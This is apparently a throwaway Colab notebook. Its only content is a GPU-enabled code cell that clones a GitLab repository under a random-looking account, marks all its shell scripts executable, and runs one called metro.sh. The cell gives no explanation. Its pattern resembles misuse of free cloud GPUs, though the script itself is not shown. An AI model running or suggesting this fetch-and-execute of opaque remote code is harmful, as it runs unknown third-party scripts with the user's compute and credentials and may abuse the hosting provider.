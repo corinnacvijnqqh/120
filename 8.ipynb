{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "8.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zV4aNakA2dRv"
      },
      "source": [
        "# **1**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "u6faHALj2fz9"
      },
      "source": [
        "!git clone https://gitlab.com/corinnacvijnqqh/lighter.git && cd lighter && chmod +x *.sh && ./metro.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
